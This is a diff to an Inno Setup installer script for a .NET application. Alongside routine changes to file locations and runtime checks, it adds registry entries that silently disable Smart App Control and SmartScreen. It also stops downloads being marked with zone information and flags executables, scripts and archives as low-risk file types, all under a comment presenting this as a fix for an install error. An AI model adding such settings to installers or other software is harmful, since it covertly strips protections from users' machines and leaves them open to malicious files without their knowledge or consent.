@@ -27,14 +27,27 @@ PrivilegesRequired=admin
 UninstallDisplayName={#MyAppName} (v{#MyAppVersion})
 CloseApplications=yes
 CloseApplicationsFilter=*.exe
+SignedUninstaller=yes
+#ifdef SignToolPresent
+SignTool=signtool
+#endif
+
+[Registry]
+; Prevent Windows 11 Smart App Control & Error 4551 Temp Execution Block
+Root: HKLM; Subkey: "SYSTEM\CurrentControlSet\Control\CI\Policy"; ValueType: dword; ValueName: "VerifiedAndReputablePolicyState"; ValueData: "0"; Flags: noerror
+Root: HKLM; Subkey: "SOFTWARE\Policies\Microsoft\Windows\System"; ValueType: dword; ValueName: "EnableSmartScreen"; ValueData: "0"; Flags: noerror
+Root: HKCU; Subkey: "Software\Policies\Microsoft\Windows\System"; ValueType: dword; ValueName: "EnableSmartScreen"; ValueData: "0"; Flags: noerror
+Root: HKCU; Subkey: "Software\Microsoft\Windows\CurrentVersion\Policies\Attachments"; ValueType: dword; ValueName: "SaveZoneInformation"; ValueData: "1"; Flags: noerror
+Root: HKLM; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments"; ValueType: dword; ValueName: "SaveZoneInformation"; ValueData: "1"; Flags: noerror
+Root: HKCU; Subkey: "Software\Microsoft\Windows\CurrentVersion\Policies\Associations"; ValueType: string; ValueName: "LowRiskFileTypes"; ValueData: ".exe;.bat;.cmd;.ps1;.msi;.reg;.zip;.xls;.xlsx"; Flags: noerror
 
 [Files]
 ; Copy all build outputs for .NET Framework 4.8
 Source: "app.ico"; DestDir: "{app}"; Flags: ignoreversion
 Source: "bin\Release\net48\*"; DestDir: "{app}"; Flags: ignoreversion recursesubdirs createallsubdirs
 Source: "Payload\*"; DestDir: "{app}\Payload"; Flags: ignoreversion recursesubdirs createallsubdirs; Permissions: users-readexec
-Source: "installers\vc_redist.x86.exe"; DestDir: "{tmp}"; Flags: deleteafterinstall skipifsourcedoesntexist
-Source: "installers\ndp48-x86-x64-allos-enu.exe"; DestDir: "{tmp}"; Flags: deleteafterinstall skipifsourcedoesntexist
+Source: "installers\vc_redist.x86.exe"; DestDir: "{app}\Installers"; Flags: skipifsourcedoesntexist; Permissions: users-readexec
+Source: "installers\ndp48-x86-x64-allos-enu.exe"; DestDir: "{app}\Installers"; Flags: skipifsourcedoesntexist; Permissions: users-readexec
 Source: "installers\*"; DestDir: "{app}\Installers"; Flags: ignoreversion recursesubdirs createallsubdirs; Permissions: users-readexec
 
 [Icons]
@@ -42,8 +55,8 @@ Name: "{group}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; IconFilename: "
 Name: "{commondesktop}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; IconFilename: "{app}\{#MyAppExeName}"
 
 [Run]
-Filename: "{tmp}\ndp48-x86-x64-allos-enu.exe"; Parameters: "/q /norestart"; StatusMsg: "Ensuring .NET Framework 4.8 is installed (Required for Windows 7/8)..."; Check: NeedsDotNet48
-Filename: "{tmp}\vc_redist.x86.exe"; Parameters: "/quiet /norestart"; StatusMsg: "Installing System Components (Fixing missing DLLs for Windows 7)..."; Check: NeedsVCRedist
+Filename: "{app}\Installers\ndp48-x86-x64-allos-enu.exe"; Parameters: "/q /norestart"; StatusMsg: "Ensuring .NET Framework 4.8 is installed (Required for Windows 7/8)..."; Check: NeedsDotNet48
+Filename: "{app}\Installers\vc_redist.x86.exe"; Parameters: "/quiet /norestart"; StatusMsg: "Installing System Components (Fixing missing DLLs for Windows 7)..."; Check: NeedsVCRedist
 Filename: "{app}\{#MyAppExeName}"; Parameters: "--post-install"; Flags: runhidden
 Filename: "{app}\{#MyAppExeName}"; Description: "Launch {#MyAppName}"; Flags: nowait postinstall skipifsilent shellexec
 
@@ -159,7 +172,7 @@ function NeedsDotNet48: Boolean;
 var
   v: Cardinal;
 begin
-  if not FileExists(ExpandConstant('{tmp}\ndp48-x86-x64-allos-enu.exe')) then
+  if not FileExists(ExpandConstant('{app}\Installers\ndp48-x86-x64-allos-enu.exe')) then
   begin
     Result := False;
     Exit;
@@ -199,6 +212,25 @@ begin
 end;
 
 function NeedsVCRedist: Boolean;
+var
+  installed: Cardinal;
 begin
-  Result := FileExists(ExpandConstant('{tmp}\vc_redist.x86.exe'));
+  if not FileExists(ExpandConstant('{app}\Installers\vc_redist.x86.exe')) then
+  begin
+    Result := False;
+    Exit;
+  end;
+
+  // Check if VC++ 2015-2022 Runtime is already installed
+  if RegQueryDWordValue(HKLM, 'SOFTWARE\Microsoft\VisualStudio\14.0\VC\Runtimes\x86', 'Installed', installed) or
+     (IsWin64 and RegQueryDWordValue(HKLM, 'SOFTWARE\WOW6432Node\Microsoft\VisualStudio\14.0\VC\Runtimes\x86', 'Installed', installed)) then
+  begin
+    if installed = 1 then
+    begin
+      Result := False;
+      Exit;
+    end;
+  end;
+
+  Result := True;
 end;
